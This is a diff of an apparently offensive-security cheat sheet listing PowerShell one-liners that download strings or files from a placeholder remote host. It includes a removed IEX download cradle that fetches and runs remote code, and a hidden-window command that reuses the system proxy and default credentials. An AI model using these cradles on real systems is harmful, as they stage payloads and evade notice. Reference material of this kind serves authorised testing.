@@ -1,15 +1,21 @@
 # download a string
-powershell "IEX(New-Object Net.WebClient).downloadString('https://<domain>')"
+(New-Object Net.WebClient).downloadString('https://<rhost>')
 # or
-$str=(New-Object Net.WebClient).DownloadData('https://<domain>'); [System.Text.Encoding]::UTF8.GetString($str)
+$str = (New-Object Net.WebClient).DownloadData('https://<rhost>'); [System.Text.Encoding]::UTF8.GetString($str)
 # or
-iwr 'https://<domain>'
-
-# download HTML source code
-$ie=New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('https://<domain>'); sleep 5; $response=$ie.Document.body.innerHTML; $ie.quit(); echo $response
+$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('https://<rhost>'); sleep 5; $response=$ie.Document.body.innerHTML; $ie.quit(); $response -replace "<pre>","" -replace "</pre>",""
 # or 
-$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','https://<domain>',$false); $h.send(); echo $h.responseText
+$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','https://<rhost>',$false); $h.send(); echo $h.responseText
 
 # download string using default proxy settings
-powershell.exe -nop -w hidden -c $t=new-object net.webclient; $t.proxy=[Net.WebRequest]::GetSystemWebProxy(); $t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $t.downloadstring('https://<domain>')
+powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.proxy=[Net.WebRequest]::GetSystemWebProxy(); $t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $t.downloadstring('https://<rhost>')
+
+# download a file
+iwr 'https://<rhost>' -OutFile <file>
+# or
+Invoke-RestMethod 'https://<rhost>' -OutFile <file>
+# or
+Start-BitsTransfer 'https://<rhost>' -Destination <file>
+# or
+$webClient = [System.Net.WebClient]::new(); $webClient.DownloadFile('https://<rhost>', '<fullPathFile>')
 
